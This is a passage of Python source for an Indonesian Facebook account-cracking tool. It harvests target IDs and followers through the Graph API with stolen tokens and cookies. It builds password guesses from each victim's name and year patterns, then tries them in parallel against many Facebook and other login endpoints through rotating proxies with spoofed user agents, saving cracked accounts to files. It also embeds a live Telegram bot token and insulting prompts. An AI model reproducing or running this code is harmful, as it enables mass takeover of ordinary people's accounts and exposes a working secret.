				tree.add(f"\r[yellow] Account chekpoin[white]").add(f"\r[yellow]{cpkuni[0]}|{cpkuni[1]}[white]  ")
				Buat(tree)
				nocp +=1
			prints(nel(f'{P2}Hasil Account Facebook [{H2} {str(len(hem))} {P2}] Tanggal [ {H2}{tgl}-{bln}-{thn} {P2}]',width=70,padding=(0,7),style=f"{color_panel}"))
			input('\n[+] Back Enter ')
			back()
	elif kz in ['2','02']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			pers = loop*100/len(id2)
			fff = '%'
			prog.update(des,description=f'\r[deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
			prog.advance(des)
			prints(nel(f'{P2}File Tidak Di Temukan{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
			time.sleep(2)
			back()
		if len(vin)==0:
			prints(nel(f'{P2}Anda Tidak Mempunyai File OK{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
			time.sleep(2)
			back()
		else:
			prints(nel(f'{P2} Silahkan File Result {H2}OK{P2} Anda [{H2} Asepitgans_XC {P2}]{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(''+nom+'. '+isi+'\033[32m '+str(len(hem))+' \033[0mSucses '+x)
				else:
					lol.update({str(cih):str(isi)})
					print(''+str(cih)+'. '+isi+'\033[32m '+str(len(hem))+' \033[0mSucses '+x)
			geeh = input('\n[+] Nomor : ')
			try:geh = lol[geeh]
			except KeyError:
				prints(nel(f'{P2}Pilih Yang Bener Kontol{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				prints(nel(f'{P2}File Tidak Di Temukan{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
				time.sleep(2)
				back()
			prints(nel(f'{P2}Hasil Account Facebook [{H2} {str(len(hem))} {P2}] Tanggal [ {H2}{tgl}-{bln}-{thn} {P2}]',width=70,padding=(0,7),style=f"{color_panel}"))
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				tree = Tree(" ")
				tree.add(f"\r[green]{cpkuni[0]}|{cpkuni[1]}[white] ").add(f"\r[green]{cpkuni[2]}[white] ")
				Buat(tree)
				nocp +=1
			prints(nel(f'{P2}Hasil Account Facebook [{H2} {str(len(hem))} {P2}] Tanggal [ {H2}{tgl}-{bln}-{thn} {P2}]',width=70,padding=(0,7),style=f"{color_panel}"))
			input('[+] Back Enter ')
			back()
	elif kz in ['0','00']:
		back()
	else:
		prints(nel(f'{P2}Pilih Yang Bener Kontol{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
		exit()
#-------------[ CRACK-FROM-FILE ]------------------#
def crack_filev2():
	prints(nel(f'{P2}Masukan file idz anda cth : [green]/sdcard/dump/ids.txt[white]{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
	o = input('[+] Nama file : ')
	try:lin = open(o).read().splitlines()
	except:
		prints(nel(f'{P2}File Tidak Di Temukan{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		time.sleep(2)
		back()
	for xid in lin:
		id.append(xid)
	setting()
	
#-----------[crack dump file]----------#
def crack_file():
	try:vin = os.listdir('DUMP')
	except FileNotFoundError:
		prints(nel(f'{P2}File Tidak Di Temukan{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
		time.sleep(2)
		back()
	if len(vin)==0:
		prints(nel(f'{P2}Kamu Tidak Memiliki File Dump{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
		time.sleep(2)
		back()
	else:
		prints(nel(f'{P2}Pilih File yang ingin di crack [{H2} Asepitgans_XC {P2}]{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('DUMP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f' %s. %s ({PI} %s{x} idz )'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				print(' %s. %s ({PI} %s {x}idz) '%(cih,isi,len(hem)))
		geeh = input('\n[+] Pilih : ')
		try:geh = lol[geeh]
		except KeyError:
			prints(nel(f'{P2}Pilih Yang Bener Kontol{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
			time.sleep(3)
			back()
		try:lin = open('DUMP/'+geh,'r').read().splitlines()
		except:
			prints(nel(f'{P2}File Tidak Ditemukan, Coba Lagi Nanti{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
			time.sleep(2)
			back()
		for xid in lin:
			id.append(xid)
		setting()

#-------------------[ CRACK-PENGIKUT ]----------------#
def dump_pengikut():
        try:
                token = open('.token.txt','r').read()
                cok = open('.cok.txt','r').read()
        except IOError:
                exit()
        print('>> Ketik ( me ) Jika Ingin Crack Follower Sendiri ')
        pil = input('>> Masukkan Idz Target : ')
        try:
                koh2 = requests.get('https://graph.facebook.com/'+pil+'?fields=subscribers.limit(99999)&access_token='+tokenku[0],cookies={'cookie': cok}).json()
                for pi in koh2['subscribers']['data']:
                        try:id.append(pi['id']+'|'+pi['name'])
                        except:continue
                print(f'>> Total Idz :{PI} '+str(len(id)))
                setting()
        except requests.exceptions.ConnectionError:
                print('>> Koneksi Internet Bermasalah ')
                exit()
        except (KeyError,IOError):
                print('>> Gagal Mengambil Target ')
                exit()

def report():
	cetak(nel(f"Silahkan masuk bug anda dan isi nama lu yah tolol",width=70))
	nama_mu = input(f"[+] Masukan Nama Kamu: ")
	bug = input(f"[+] Silakan Ketik Bugnya : ")
	pesan = f"""    🔰Pesan Dari {nama_mu}🔰

{bug}

"""
	requests.get(f"https://api.telegram.org/bot6286449191:AAG3uDgINsf48ZhKxDv5-wvEIAHhz8vNbhQ/sendMessage?chat_id=5087794076&text={pesan}")
	print(f"[+] Mengirim Pesan...")
	sleep(3)
	cetak(nel(f"[+] Terimakasih Atas Masukanya om:)",width=70))
	sleep(3);login()
#----------[seting method and password]----------#
def setting():
	cetak(nel(f"{P2}[{color_text}01{P2}]. Facebook ID {M2}Old\n{P2}[{color_text}02{P2}]. Facebook ID {K2}New\n{P2}[{color_text}03{P2}]. Facebook ID {H2}Random{P2}",title=f"ID {H2}{len(id)}{P2}",width=70,padding=(0,7),style=f"{color_panel}")) 
	hu = input('[+] Pilih : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
			
	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		prints(nel(f'{P2}input correctly{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
		exit()
	#cetak(nel("[green]Validate[white] = mobileV,freeV,mbasicV\n[purple]Async[white] = mobile,free,mbasic,async,touch",title="Validate and async",width=70))
	prints(nel(f'{P2}[{color_text}0A{P2}]. Login www messenger.com [ [green]masager Base[white] ]\n{P2}[{color_text}00{P2}]. Login www mobile.facebook.com [ [green]Validate Base[white] ]\n{P2}[{color_text}01{P2}]. Login www m.facebook.com [ [green]Link sakti[white] ]\n[{color_text}02{P2}]. Login www free.facebook.com [ [green]Validate[white] ]\n[{color_text}03{P2}]. Login www mbasic.facebook.com [ [green]Validate[white] ]\n[{color_text}04{P2}]. Login www m.facebook.com [ [red]Reguler[white] ]\n[{color_text}05{P2}]. Login www free.facebook.com [ [red]Reguler[white] ]\n[{color_text}06{P2}]. Login www mbasic.facebook.com [ [red]Reguler[white] ]\n[{color_text}07{P2}]. Login www m.facebook.com [ [red]Async[white] ]\n{P2}[{color_text}08{P2}]. Login www touch.facebook.com [ [green] Async[white] ]\n{P2}[{color_text}99{P2}]. Login www Lainya [ [green]Terbaru ] {P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
	#xxkontol=[]
	#xxkontol.append(Panel(f"""{P2}[{color_text}01{P2}]. Login site {H2}m.facebook.com\n{P2}[{color_text}02{P2}]. Login site {H2}free.facebook.com\n{P2}[{color_text}03{P2}]. Login site {H2}mbasic.facebook.com{P2}""",title=f"Validate",width=40,style=f"{color_table}"))
	#xxkontol.append(Panel(f"""{P2}[{color_text}04{P2}]. Login site {H2}m.facebook.com\n{P2}[{color_text}05{P2}]. Login site {H2}free.facebook.com\n{P2}[{color_text}06{P2}]. Login site {H2}mbasic.facebook.com{P2}""",title=f"Reguler",width=40,style=f"{color_table}"))
	#xxkontol.append(Panel(f"""{P2}[{color_text}07{P2}]. Login site {H2}m.facebook.com\n{P2}[{color_text}08{P2}]. Login site {H2}b-api.facebook.com{P2}""",title=f"Async",width=40,style=f"{color_table}"))
	#xxkontol.append(Panel(f"""{P2}[{color_text}09{P2}]. Login site {H2}iphone.facebook.com{P2}\n[{color_text}10{P2}]. Login site {H2}trun.facebook.com""",title=f"NewMethod",width=40,style=f"{color_table}"))
	#console.print(Columns(xxkontol))
	#prints(nel(f'{P2}Jika ingin crack menggunakan method langka ketik "{H2}p{P2}"-"{H2}m{P2}"-"{H2}n{P2}"',width=70,padding=(0,7),style=f"{color_panel}")) 
	hc = input('[+] Pilih : ')
	if hc in ['1','mobileV']:
		#method.append('jikk')
		method.append('mobiledate')
	elif hc in ['4','mobile']:
		#khususprem()
		method.append('mobilereg')
	elif hc in ['0a','0A']:
		#khususprem()
		method.append('massage')
	elif hc in ['0','00']:
		#khususprem()
		method.append('validate')
	elif hc in ['2','freeV']:
		#khususprem()
		method.append('freedate')
	elif hc in ['5','free']:
		#khususprem()
		method.append('freereg')
	elif hc in ['3','mbasicV']:
		#khususprem()
		method.append('mbasicdate')
	elif hc in ['6','mbasic']:
		#khususprem()
		method.append('mbasicreg')
	elif hc in ['8','touch']:
		#khususprem()
		method.append('touch')
	elif hc in ['7','async']:
		#khususprem()
		method.append('pengen')
	elif hc in ['9','09']:
		#khususprem()
		method.append('baru')
	elif hc in ['10']:
		#khususprem()
		method.append('coba')
	elif hc in ['m','M']:
		#khususprem()
		method.append('jikk')
	elif hc in ['p','P']:
		#khususprem()
		method.append('pasii')
	elif hc in ['n','N']:
		#khususprem()
		method.append('noki')
	elif hc in ['Tes','tes']:
		method.append('touch')
	elif hc in ['99']:
		prints(nel(f'{P2}{P2}[{color_text}01{P2}]. Login www Vidio\n{P2}[{color_text}02{P2}]. Login www Iflix\n{P2}[{color_text}03{P2}]. Login www bilibili\n{P2}[{color_text}04{P2}]. Login www Wetv\n{P2}[{color_text}05{P2}]. Login www Webnovel\n{P2}[{color_text}06{P2}]. Login www Trun\n{P2}[{color_text}07{P2}]. Login www Iphone\n{P2}[{color_text}08{P2}]. Login www Prod\n{P2}[{color_text}09{P2}]. Login www Nokia\n{P2}[{color_text}10{P2}]. Login www capcut{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		hh = input('[+] Pilih : ')
		if hh in ['01','1']:
			method.append('vidio')
		elif hh in ['02','2']:
			method.append('iflix')
		elif hh in ['03','3']:
			method.append('bilibili')
		elif hh in ['04','4']:
			method.append('wetv')
		elif hh in ['05','5']:
			method.append('webnovel')
		elif hh in ['06','6']:
			method.append('coba')
		elif hh in ['07','7']:
			method.append('baru')
		elif hh in ['08','8']:
			method.append('pasii')
		elif hh in ['09','9']:
			method.append('noki')
		elif hh in ['10']:
			method.append('capcut')
		
	else:
		method.append('mobiledate')
	prints(nel(f'{P2}Mau tampilkan tap aplikasi yang terkait di dalam akun?{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
	_Asepitgans_ = input('[+] Add tap aplikasi y/t > ')
	if _Asepitgans_ in ['']:
		prints(nel(f'{P2}Pilih yang bener lah anjing{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		back()
	elif _Asepitgans_ in ['y','Y']:
		taplikasi.append('ya')
	else:
		taplikasi.append('no')
	prints(nel(f'{P2}Mau tampilkan opsi cekpoint yang terkait di dalam akun?{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
	_AsepitgasXC_ = input(f'[+] Add opsi cekpoin y/t > ')
	if _AsepitgasXC_ in ['']:
		prints(nel(f'{P2}Pilih yang bener lah anjing{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		back()
	elif _AsepitgasXC_ in ['y','Y']:
		gabriel.append('ya')
	else:
		gabriel.append('no')
	
	prints(nel(f'{P2}Mau menggunakan user agent sendiri? Chrom [green]my user agent[white]{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
	uatambah = input(f'[+] Add my user agent y/t > ')
	if uatambah in ['y','Ya','ya','Y']:
		ualuh.append('ya')
		bzer = input(f'[+] Masukan User-Agent : ')
		ualu.append(bzer)
	else:
		ualuh.append('tidak')
	
	#prints(nel(f'{P2}Mau mengubah password saat dapat resuslt?{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
	#pw=input("[+]\033[0m Add ubah password y/t > ")
	#if pw in['y','Y']:
		#ubah_pass.append("ubah_sandi")
		#pw2 = input("\033[0m[+]%s \033[0mmasukan sandi %s> %s"%(O,M,K))
		#if len(pw2) <= 5:
			#print("[+] %ssandi minimal 6 karakter "%(M))
		#else:
			#pwbaru.append(pw2)
	#prints(nel(f'{P2}Mau tambahkan password kah lu mek?{P2}',#width=70,padding=(0,7),style=f"{color_panel}"))
	#pwplus=input('[+] Add Password Manual y/t > ')
	#if pwplus in ['y','Y','ya']:
		#pwpluss.append('ya')
		#prints(nel(f'{P2}Enter an additional password of at least 6 #characters\nExample :[green] Indonesia,rahasia,katasandi[white]{P2}',#width=70,padding=(0,7),style=f"{color_panel}"))
		#pwku=input('[+] Enter Additional Password : ')
		#pwkuh=pwku.split(',')
		#for xpw in pwkuh:
			#pwnya.append(xpw)
	#else:
		#pwpluss.append('tidak')
	su()
	   

#-----------[password generator]----------#
def jancok():
	cetak(nel(f"{P2}[{color_text}01{P2}]. PasswordV¹  [{H2} Disarankan Ini {P2}]\n[{color_text}02{P2}]. PasswordV²  [{H2} Disarankan Ini {P2}]",width=70,style=f"{color_panel}")) 
	ch = input('[•] Pilih  : ')
	if ch in ['1','01']:
		babi()
	elif ch in ['2','02']:
		passu()
	else:
		passu()
	
def su():
	cetak(nel(f'{P2}{P2}[{color_text}01{P2}]. Password Manual\n{P2}[{color_text}02{P2}]. Password Gabungan\n{P2}[{color_text}03{P2}]. Password Otomatis{P2}',subtitle='04. Password Terbaru',width=70,padding=(0,7),style=f"{color_panel}"))
	hah = input('[+] pilih : ')
	if hah in ['1','01']:
		prints(nel(f'{P2}Enter an additional password of at least 6 characters\nExample :[green] Indonesia,rahasia,katasandi[white]{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		pwku=input('[+] Password : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
		else:babi()
	if hah in ['3','03']:
		babi()
	if hah in ['2','02']:
		global ok,cp
		A = ["123456"]
		prints(nel(f'{P2}Enter an additional password of at least 6 characters\nExample :[green] Indonesia,rahasia,katasandi[white]{P2}\nbehind :[green] 123,1234,12345,123456[white]{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		B = input(f'[+] Password : ').split(',')
		C = input(f'[+] Behind Password : ')
		if ',' in str(C):
			cetak(nel(f'sandi belakang satu kata saja'));exit()
		global prog,des
	prints(nel(f'{P2}Ok Simpan File : {H2}OK/%s\n{P2}CP Simpan File : {K2}CP/%s{P2}'%(okc,cpc),subtitle=f'Mainkan mode pesawat 10 detik, jika tidak ada hasil',width=70,padding=(0,7),style=f"{color_panel}"))
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				Depan = nmf.split(' ')[0]
				pwv = ['bagong']
				if len(nmf)<=5:
					if len(Depan)<3:
						pass
					else:
						pwv.append(nmf)
						pwv.append(Depan+'321')
						pwv.append(Depan+'123')
						pwv.append(Depan+'1234')
						pwv.append(Depan+'12345')
						pwv.append(Depan+'123456')
				else:
					if len(Depan)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(Depan+'321')
						pwv.append(Depan+'2000')
						pwv.append(Depan+'2001')
						pwv.append(Depan+'2002')
						pwv.append(Depan+'2003')
						pwv.append(Depan+'2004')
						pwv.append(Depan+'2005')
						pwv.append(Depan+'2006')
						pwv.append(Depan+'2007')
						pwv.append(Depan+'2008')
						pwv.append(Depan+'2010')
						pwv.append(Depan+'2009')
						pwv.append(Depan+'123')
						pwv.append(Depan+'1234')
						pwv.append(Depan+'12345')
						pwv.append(Depan+'123456')
				if 'ya' in pwpluss:
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'mobiledate' in method:
					pool.submit(crackdate,idf,pwv,nmf)
				elif 'validate' in method:
					pool.submit(validatee1,idf,pwv,nmf)
				elif 'mobilereg' in method:
					pool.submit(crackreg,idf,pwv,nmf)
				elif 'freedate' in method:
					pool.submit(crackfreedate,idf,pwv,nmf)
				elif 'freereg' in method:
					pool.submit(crackfreereg,idf,pwv,nmf)
				elif 'mbasicdate' in method:
					pool.submit(crackmbasicdate,idf,pwv,nmf)
				elif 'new' in method:
					pool.submit(crackapi,idf,pwv,nmf)
				elif 'baru' in method:
					pool.submit(cracklawakv1,idf,pwv,nmf)
				elif 'coba' in method:
					pool.submit(cracktrun,idf,pwv,nmf)
				elif 'pengen' in method:
					pool.submit(Asepitgans_Xd,idf,pwv,nmf)
				elif 'pasii' in method:
					pool.submit(crackprode,idf,pwv,nmf)
				elif 'jikk' in method:
					pool.submit(crackate,idf,pwv,nmf)
				elif 'noki' in method:
					pool.submit(cracknokia,idf,pwv,nmf)
				elif 'wetv' in method:
					pool.submit(wetv,idf,pwv,nmf)
				elif 'bilibili' in method:
					pool.submit(bilibili,idf,pwv,nmf)
				elif 'iflik' in method:
					pool.submit(iflik,idf,pwv,nmf)
				elif 'vidio' in method:
					pool.submit(vidio,idf,pwv,nmf)
				elif 'webnovel' in method:
					pool.submit(webnovel,idf,pwv,nmf)
				elif 'touch' in method:
					pool.submit(touch,idf,pwv,nmf)
				elif 'capcut' in method:
					pool.submit(touchV1,idf,pwv,nmf)
				elif 'massage' in method:
					pool.submit(_messenger_,idf,pwv,nmf)
				else:
					pool.submit(_messenger_,idf,pwv,nmf)
		print('')
		prints(nel(f'{P2}Sucses Cracked Ok:[green]%s[white] Cp:[yellow]%s[white] Akuntod{P2}'%(ok,cp),width=70,padding=(0,7),style=f"{color_panel}"));exit()
		print('')
		
		
#-----------[crack berlangsung]----------#
def passu():
	global prog,des
	prints(nel(f'{P2}Ok Simpan File : {H2}OK/%s\n{P2}CP Simpan File : {K2}CP/%s{P2}'%(okc,cpc),subtitle=f'Mainkan mode pesawat 10 detik, jika tidak ada hasil',width=70,padding=(0,7),style=f"{color_panel}"))
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				Depan = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<=5:
					if len(Depan)<3:
						pass
					else:
						pwv.append(nmf)
						pwv.append(Depan+'321')
						pwv.append(Depan+'123')
						pwv.append(Depan+'1234')
						pwv.append(Depan+'12345')
						pwv.append(Depan+'123456')
				else:
					if len(Depan)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(Depan+'321')
						pwv.append(Depan+'2000')
						pwv.append(Depan+'2001')
						pwv.append(Depan+'2002')
						pwv.append(Depan+'2003')
						pwv.append(Depan+'2004')
						pwv.append(Depan+'2005')
						pwv.append(Depan+'2006')
						pwv.append(Depan+'2007')
						pwv.append(Depan+'2008')
						pwv.append(Depan+'2010')
						pwv.append(Depan+'2009')
						pwv.append(Depan+'123')
						pwv.append(Depan+'1234')
						pwv.append(Depan+'12345')
						pwv.append(Depan+'123456')
				if 'ya' in pwpluss:
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'mobiledate' in method:
					pool.submit(crackdate,idf,pwv,nmf)
				elif 'validate' in method:
					pool.submit(validatee1,idf,pwv,nmf)
				elif 'mobilereg' in method:
					pool.submit(crackreg,idf,pwv,nmf)
				elif 'freedate' in method:
					pool.submit(crackfreedate,idf,pwv,nmf)
				elif 'freereg' in method:
					pool.submit(crackfreereg,idf,pwv,nmf)
				elif 'mbasicdate' in method:
					pool.submit(crackmbasicdate,idf,pwv,nmf)
				elif 'new' in method:
					pool.submit(crackapi,idf,pwv,nmf)
				elif 'baru' in method:
					pool.submit(cracklawakv1,idf,pwv,nmf)
				elif 'coba' in method:
					pool.submit(cracktrun,idf,pwv,nmf)
				elif 'pengen' in method:
					pool.submit(Asepitgans_Xd,idf,pwv,nmf)
				elif 'pasii' in method:
					pool.submit(crackprode,idf,pwv,nmf)
				elif 'jikk' in method:
					pool.submit(crackate,idf,pwv,nmf)
				elif 'noki' in method:
					pool.submit(cracknokia,idf,pwv,nmf)
				elif 'wetv' in method:
					pool.submit(wetv,idf,pwv,nmf)
				elif 'bilibili' in method:
					pool.submit(bilibili,idf,pwv,nmf)
				elif 'iflik' in method:
					pool.submit(iflik,idf,pwv,nmf)
				elif 'vidio' in method:
					pool.submit(vidio,idf,pwv,nmf)
				elif 'webnovel' in method:
					pool.submit(webnovel,idf,pwv,nmf)
				elif 'touch' in method:
					pool.submit(touch,idf,pwv,nmf)
				elif 'capcut' in method:
					pool.submit(touchV1,idf,pwv,nmf)
				elif 'massage' in method:
					pool.submit(_messenger_,idf,pwv,nmf)
				else:
					pool.submit(_messenger_,idf,pwv,nmf)
		print('')
		prints(nel(f'{P2}Sucses Cracked Ok:[green]%s[white] Cp:[yellow]%s[white] Akuntod{P2}'%(ok,cp),width=70,padding=(0,7),style=f"{color_panel}"));exit()
		print('')
		
		
def babi():
	global prog,des
	prints(nel(f'{P2}Ok Simpan File : {H2}OK/%s\n{P2}CP Simpan File : {K2}CP/%s{P2}'%(okc,cpc),subtitle=f'Mainkan mode pesawat 10 detik, jika tidak ada hasil',width=70,padding=(0,7),style=f"{color_panel}"))
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(nmf)
						pwv.append(frs+'321')
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'01')
						pwv.append(frs+'02')
						pwv.append(frs+'03')
						pwv.append(frs+'04')
						pwv.append(frs+'05')
						pwv.append(frs+'06')
						pwv.append(frs+'07')
						pwv.append(frs+'08')
						pwv.append(frs+'09')
						pwv.append(frs+'10')
						pwv.append(frs+'11')
						pwv.append(frs+'12')
						pwv.append(frs+'13')
						pwv.append(frs+'14')
						pwv.append(frs+'15')
						pwv.append(frs+'321')
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
				if 'ya' in pwpluss:
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'mobiledate' in method:
					pool.submit(crackdate,idf,pwv,nmf)
				elif 'validate' in method:
					pool.submit(validatee1,idf,pwv,nmf)
				elif 'mobilereg' in method:
					pool.submit(crackreg,idf,pwv,nmf)
				elif 'freedate' in method:
					pool.submit(crackfreedate,idf,pwv,nmf)
				elif 'freereg' in method:
					pool.submit(crackfreereg,idf,pwv,nmf)
				elif 'mbasicdate' in method:
					pool.submit(crackmbasicdate,idf,pwv,nmf)
				elif 'mbasicreg' in method:
					pool.submit(crackmbasicreg,idf,pwv,nmf)
				elif 'new' in method:
					pool.submit(crackapi,idf,pwv,nmf)
				elif 'baru' in method:
					pool.submit(cracklawakv1,idf,pwv,nmf)
				elif 'coba' in method:
					pool.submit(cracktrun,idf,pwv,nmf)
				elif 'pengen' in method:
					pool.submit(Asepitgans_Xd,idf,pwv,nmf)
				elif 'pasii' in method:
					pool.submit(crackprode,idf,pwv,nmf)
				elif 'jikk' in method:
					pool.submit(crackate,idf,pwv,nmf)
				elif 'noki' in method:
					pool.submit(cracknokia,idf,pwv,nmf)
				elif 'wetv' in method:
					pool.submit(wetv,idf,pwv,nmf)
				elif 'bilibili' in method:
					pool.submit(bilibili,idf,pwv,nmf)
				elif 'iflik' in method:
					pool.submit(iflik,idf,pwv,nmf)
				elif 'vidio' in method:
					pool.submit(vidio,idf,pwv,nmf)
				elif 'webnovel' in method:
					pool.submit(webnovel,idf,pwv,nmf)
				elif 'touch' in method:
					pool.submit(touch,idf,pwv,nmf)
				elif 'capcut' in method:
					pool.submit(touchV1,idf,pwv,nmf)
				elif 'massage' in method:
					pool.submit(_messenger_,idf,pwv,nmf)
				else:
					pool.submit(_messenger_,idf,pwv,nmf)
		print('')
		prints(nel(f'{P2}Sucses Cracked Ok:[green]%s[white] Cp:[yellow]%s[white] Akuntod{P2}'%(ok,cp),width=70,padding=(0,7),style=f"{color_panel}"));exit()
		print('')
		

###---[ CONVERT COOKIE ]---###
def convert(cookie):
	cok = ('xs=%s;datr=%s;c_user=%s;fr=%s'%(cookie['xs'],cookie['datr'],cookie['c_user'],cookie['fr']))
	return(str(cok))
	
def convertori(cookie):
	cok = ('fr=%s;datr=%s;c_user=%s;xs=%s'%(cookie['fr'],cookie['datr'],cookie['c_user'],cookie['xs']))
	return(str(cok))
	
###-----[ GET AND POST ]----------####
def geturl():
    url = " "
    nokia = f"'https://nokia.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr'"
    return nokia 

def reguler():
	url = ""
	reguler = f"https://m.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated"
	return reguler
	
def posturl():
    url = " "
    nokia = f"https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID"
    return nokia
    
def posturl1():
    url = " "
    samsu = f"https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
    return samsu

###----------[ ASYNC ]----------###
def touchV1(idf,pwv,nmf):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'\r[deep_white]Mobile Capcut {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)}')
	prog.advance(des)
	ses = requests.Session()
	ua = uaasepitgansxc()
	ua2 = random.choice(ugen3)
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({"Host": "touch.facebook.com","cache-control": "max-age=0","user-agent": ua2,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Chromium";v="107", "Not=A?Brand";v="24"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-dest": "document","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
